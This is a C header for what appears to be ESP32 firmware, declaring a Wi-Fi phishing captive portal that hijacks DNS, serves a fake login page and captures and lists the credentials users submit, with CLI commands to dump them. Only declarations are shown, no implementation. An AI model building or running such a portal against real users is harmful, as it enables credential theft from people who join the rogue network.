/*
 * phish.h: 钓鱼门户 (Captive Portal)
 *
 * 复用 http_server 的 SoftAP + httpd, 增加:
 *   - DNS 劫持 (所有域名 -> AP IP)
 *   - 门户页面 (自定义 HTML 存 Flash storage 裸分区, 未上传时用内置模板)
 *   - 表单凭据捕获
 *
 * CLI:
 *   phish start <ssid> [pass]   启动门户
 *   phish stop                  停止
 *   phish status                状态
 *   phish stations              列出已接入门户的客户端 (MAC + RSSI)
 *   phish creds                 列出捕获的凭据
 *   phish creds clear           清空凭据
 *   phish html size             自定义页面字节数
 *   phish html clear            删除自定义页面 (回退内置模板)
 *   phish html begin <n>        开始上传 (随后由 BLE FILE 帧写数据)
 *   phish html end              提交上传
 */
#pragma once

#include <stdbool.h>
#include <stdint.h>
#include "esp_err.h"
#include "esp_http_server.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 自定义页面最大字节数 (storage 分区实际 8MB, 这里限 1MB 足够) */
#define PHISH_HTML_MAX  (1024 * 1024)

esp_err_t phish_start(const char *ssid, const char *pass);
esp_err_t phish_stop(void);
bool      phish_is_on(void);
void      phish_status(void);
void      phish_stations(void);
void      phish_creds_dump(void);
void      phish_creds_clear(void);

/* 门户开启时渲染门户页 (供 http_server 的根路径复用).
 * 返回 true 表示已处理并结束响应. */
bool      phish_serve_portal_page(httpd_req_t *r);

/* httpd 起来 (或重建) 后调用: 门户若开着, 把门户路由重新挂到该实例上.
 * httpd 被 http stop/start 重建时旧 handler 会全部失效, 必须重挂. */
void phish_on_httpd_ready(httpd_handle_t srv);

/* 自定义门户 HTML (存 Flash storage 裸分区) */
int       phish_html_size(void);
void      phish_html_clear(void);
int       phish_html_begin(int total);
int       phish_html_chunk(int offset, const uint8_t *data, int len);
esp_err_t phish_html_end(void);

#ifdef __cplusplus
}
#endif
